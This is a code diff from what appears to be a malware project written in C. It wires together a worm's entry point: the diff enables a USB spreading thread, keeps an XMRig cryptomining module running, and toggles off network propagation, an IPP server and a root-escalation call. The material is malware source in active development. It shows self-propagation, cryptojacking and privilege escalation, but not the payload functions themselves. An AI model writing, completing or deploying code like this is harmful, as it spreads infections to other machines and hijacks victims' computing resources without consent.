@@ -4,6 +4,7 @@
 #include "scanner.h"
 #include "xmr.h"
 #include "utils.h"
+#include "unix_usb_spreader.h"
 
 void * start_propagate(void *varg){
     Globals *global = (Globals *) varg;
@@ -22,28 +23,25 @@ void * start_ipp_server(void *varg){
     serve(global);
 }
 
-/*
 void * start_usb_propagate(void *varg) {
     Globals *global = (Globals *) varg;
     DEBUG_LOG("[ENTRY] Starting usb spreading module...\n");
-    //startUSBSpreadModule
+    usb_spread_module(global);
 }
-*/
 
 void * start_xmr(void *varg) {
     Globals *global = (Globals *) varg;
     DEBUG_LOG("[ENTRY] Starting xmr module...\n");
     xmrig(global);
-    DEBUG_LOG("after xmrig main func\n");
 }
 
 void entry(Globals *global) {
     // try to gain root
-    try_get_root(global);
+    //try_get_root(global);
 
     // load the file content into the global buffer
     load_file_bytes(global);
-
+/*
     // start propagate
     pthread_t thread_id_propagate;
     global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);
@@ -55,10 +53,10 @@ void entry(Globals *global) {
     // start ipp server
     pthread_t thread_id_ipp;
     global->pthread_create(&thread_id_ipp, NULL, start_ipp_server, global);
-
+*/
     // start usb spread monitor
-    //pthread_t thread_id_usb;
-    //global->pthread_create(&thread_id_usb, NULL, start_usb_propagate, global);
+    pthread_t thread_id_usb;
+    global->pthread_create(&thread_id_usb, NULL, start_usb_propagate, global);
     
 
     //TODO: remove test cryptominer, use from trigger moment instead
